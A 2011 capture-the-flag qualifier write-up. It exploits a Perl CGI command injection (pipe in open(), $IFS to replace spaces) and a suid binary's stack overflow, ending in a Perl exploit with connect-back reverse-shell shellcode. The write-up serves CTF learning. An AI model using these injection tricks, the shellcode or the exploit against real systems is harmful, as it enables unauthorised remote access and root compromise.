Hacktivity 2011 Capture the Flag qualifier write-up
===================================================

Original release date: 2011-09-03 16:50:34

In this write-up I will show you how the Hacktivity 2011 CtF qualifier victim machine could be pwned.

A network scan reveals a few interesting open ports:

```
[0x00 ~]$ nmap -p 1-65535 -T4 -A -v 195.56.122.9 -Pn
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6 (protocol 2.0)
| ssh-hostkey: 1024 5f:79:5e:b1:c6:b7:33:d5:10:af:a3:fc:15:7c:b2:b5 (DSA)
|_2048 42:30:46:db:29:5e:f6:97:85:16:0d:ec:4e:12:c3:49 (RSA)
79/tcp   open  finger  Debian fingerd
| finger: Login     Name       Tty      Idle  Login Time   Office     Office Phone
| root      root      *pts/1    2:59  Sep  2 23:38 (catv-89-133-10-233.catv.broadband.hu)
| root      root      *pts/2       1  Sep  3 03:05 (catv-89-133-91-14.catv.broadband.hu)
|_root      root      *pts/3          Sep  2 14:13 (vsza.hu)
109/tcp  open  pop2?
8976/tcp open  http    lighttpd 1.4.28
|_http-methods: OPTIONS GET HEAD POST
|_http-title: Zahia Dehar unofficial "fun" page
```

msf's finger scanner does not reveal any useful information:

```
[0x00 ~]$ tools/msf3/msfcli auxiliary/scanner/finger/finger_users \\
    RHOSTS=195.56.122.9 E
[+] 195.56.122.9:79 - Found user: root
[+] 195.56.122.9:79 Users found: root
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Telnetting to port 109 tells that POP2 service is not running:

```
[0x00 ~]$ telnet 195.56.122.9 109
Trying 195.56.122.9...
Connected to 195.56.122.9.
Escape character is '^]'.
\- POP2 server disabled on this system
Connection closed by foreign host.
```

OK, what about the web server? The site is an unofficial fun page of Zahia Dehar :) Note to the organizers: last year's Fresh babes were a much better choice :P

A quick search on exploit-db reveals that there are no known vulnerabilities for this version of lighttpd.

DirBuser can find an admin/ directory with a login page. It looks like there is an SQLi in the login.cgi, but it turns out to be just a trap. Since the login page is a .cgi, maybe setting DirBuster to find .cgis is a good step. Indeed, it is, it finds another file, admin.cgi.

Requesting this file gives us a very interesting response:

```
[0x00 ~]$ telnet 195.56.122.9 8976
Trying 195.56.122.9...
Connected to 195.56.122.9.
Escape character is '^]'.
GET /cgi-bin/admin.cgi HTTP/1.1
Host: 195.56.122.9

HTTP/1.1 200 OK
Content-type: text/html
Transfer-Encoding: chunked
Date: Sat, 03 Sep 2011 10:14:05 GMT
Server: lighttpd/1.4.28

19
Opening QUERY_STRING<br/>
0

Connection closed by foreign host.
```

WTF, really? Could it be ... ? Let's try it.

```
[0x00 ~]$ telnet 195.56.122.9 8976
Trying 195.56.122.9...
Connected to 195.56.122.9.
Escape character is '^]'.
GET /cgi-bin/admin.cgi?admin.cgi HTTP/1.1
Host: 195.56.122.9 

HTTP/1.1 200 OK
Content-type: text/html
Transfer-Encoding: chunked
Date: Sat, 03 Sep 2011 10:13:08 GMT
Server: lighttpd/1.4.28

d7
Opening QUERY_STRING<br/>#!/usr/bin/perl
print "Content-type: text/html\\n\\n";

$thatsit=$ENV{'QUERY_STRING'};
print "Opening QUERY_STRING<br/>";
open (IN,"$thatsit");
while($aline=<in>){
		print $aline;
}
close IN;

0

Connection closed by foreign host.</in> 
```

OK, it seems we can read any file the user running the web server has access to. After lots, I mean LOTS of struggling we finally decided to read perl's manual regarding OPEN :) It was a fruitful decision: turned out that OPEN can be used to run commands with some pipe-magic:

```
[0x00 ~]$ telnet 195.56.122.9 8976
Trying 195.56.122.9...
Connected to 195.56.122.9.
Escape character is '^]'.
GET /cgi-bin/admin.cgi?ls| HTTP/1.1
Host: 195.56.122.9 

HTTP/1.1 200 OK
Content-type: text/html
Transfer-Encoding: chunked
Date: Sat, 03 Sep 2011 10:21:39 GMT
Server: lighttpd/1.4.28

19
Opening QUERY_STRING<br/>
1f
admin.cgi
index.html
login.cgi

0

Connection closed by foreign host.
```

Yeah :D The only problem is, that spaces are not allowed. But it is not really a problem, since we've got a friend called $IFS. Yepp, the internal field separator, which usually is a space character. PoC:

```
[0x00 ~]$  telnet 195.56.122.9 8976
Trying 195.56.122.9...
Connected to 195.56.122.9.
Escape character is '^]'.
GET /cgi-bin/admin.cgi?ls$IFS-al| HTTP/1.1
Host: 195.56.122.9 

HTTP/1.1 200 OK
Content-type: text/html
Transfer-Encoding: chunked
Date: Sat, 03 Sep 2011 10:23:59 GMT
Server: lighttpd/1.4.28

19
Opening QUERY_STRING<br/>
fa
total 16
drwxr-xr-x 2 root root 4096 Sep  1 10:34 .
drwxr-xr-x 4 root root 4096 Sep  1 06:58 ..
-rw-r--r-- 1 root root  190 Aug 29 14:03 admin.cgi
-rw-r--r-- 1 root root    0 Sep  1 08:27 index.html
-rw-r--r-- 1 root root 1002 Sep  1 06:32 login.cgi

0

Connection closed by foreign host.
```

Nice :) A few lines of shell code, and we don't even have to run commands through telnet/web browser:

```
#!/bin/sh
while read line; do
  CMD=`echo $line | sed -e 's/ /$IFS/g'`
  fetch -q -o - "http://195.56.122.9:8976/cgi-bin/admin.cgi?$CMD|" 
done
```

Issuing the following command reveals the location of the proof.txt file:

```
find / -name 'proof.txt' -print
Opening QUERY_STRING<br/>/var/mail/proof.txt
```

catting it:

```
cat /var/mail/proof.txt
Opening QUERY_STRING<br/>206208e8903e584d5143d909182261a4
```

Yey, 42 points scored. Now the root access.

The kernel is of version 2.6.32:

```
uname -a
Opening QUERY_STRING<br/>Linux debian 2.6.32-5-686 #1 SMP \\
     Mon Jun 13 04:13:06 UTC 2011 i686 GNU/Linux
```

Tried all the local root sploits we could find -> no success. No known exploits, so we have to find a vuln and create one for ourselves. Here is a list of all suid executables:

```
find / -user 'root' -perm -4000 -print
Opening QUERY_STRING<br/>/sbin/mount.nfs
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/procmail
/usr/bin/gpasswd
/usr/local/bin/reader
/usr/exim/bin/exim-4.63-1
/bin/mount
/bin/umount
/bin/ping6
/bin/su
/bin/ping
```

OK, /usr/local/bin/reader seems suspicious. Let's download it!

```
[0x00 ~]$ fetch "http://195.56.122.9:8976/cgi-bin/admin.cgi?/usr/local/bin/\\
    reader" -o reader_
```

We have to strip the first 25 byte (the Opening QUERY_STRING stuff):

```
[0x00 ~]$ dd if=reader_ of=reaeder bs=1 skip=25
```

Running, and manually fuzzing the binary reveals a buffer overlow:

```
root@bt:/media# ./reader `perl -e 'print "A"x1000'`
Success!
Segmentation fault
```

Take a closer look in gdb!

```
root@bt:/media# gdb ./reader
Reading symbols from /media/reader...(no debugging symbols found)...done.
(gdb) r `perl -e 'print "A"x1000'`
Starting program: /media/reader `perl -e 'print "A"x1000'`
Success!

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/10x $esp
0xffffd000:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd010:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd020:     0x41414141      0x41414141
(gdb) 
```

Yey, direct EIP overwrite, and our buffer can be found on the stack. Exploiting 101, piece of cake. Except when you are accostumed to the comfort of Olly, and you're fracking tired :D

It quickly turned out that the EIP overwrite begins at offset 268, and the stack pointer points to directly after it. Here is the PoC:

```
#!/usr/bin/perl

my $padding = "A"x268;
my $eip = "BBBB";
my $buf = "\\xcc"x1000;

print $padding . $eip . $buf;
```

And the result when running it:

```
root@bt:/media# gdb ./reader 
Reading symbols from /media/reader...(no debugging symbols found)...done.
(gdb) r `./poc.pl`
Starting program: /media/reader `./poc.pl`
Success!

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/16x $esp-12
0xffffcee4:     0x41414141      0x41414141      0x42424242      0xcccccccc
0xffffcef4:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xffffcf04:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xffffcf14:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
(gdb) 
```

OK, now we have to find a JMP ESP, or something similar (cause we do not want to jump to a hard-coded stack address):

```
root@bt:/media# msfelfscan -j esp reader 
[reader]
0x08048233 jmp esp
0x080550e1 push esp; ret
0x0805513f push esp; ret
0x080561c9 push esp; ret
0x08074609 push esp; retn 0x8934
0x080890ef jmp esp
0x080a0f59 push esp; ret
0x080bebc3 jmp esp
0x080bfd0f jmp esp
```

Changing the "BBBB" string, addig some nopsled and a payload, and voila, the sploit is ready:

```
#!/usr/bin/perl

my $padding = "A"x268;
my $eip = "\\x33\\x82\\x04\\x08";
my $nopsled = "\\x90"x50;
my $buf =
"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd" .
"\\x80\\x5b\\x5e\\x68\\x98\\x42\\xd7\\xf1\\x66\\x68\\xbf\\x68\\x66\\x53" .
"\\x6a\\x10\\x51\\x50\\x89\\xe1\\x43\\x6a\\x66\\x58\\xcd\\x80\\x59\\x87" .
"\\xd9\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x50\\x68\\x2f\\x2f\\x73\\x68" .
"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd" .
"\\x80";

print $padding . $eip . $nopsled . $buf;
```

The payload we used was a connect-back shell. Fired up the exploit, got the shell, and we were just a cat away from getting our 69 points :)

Thx for the organizers, it was fun! And thx for all who read this stuff! See you @hacktiviy!
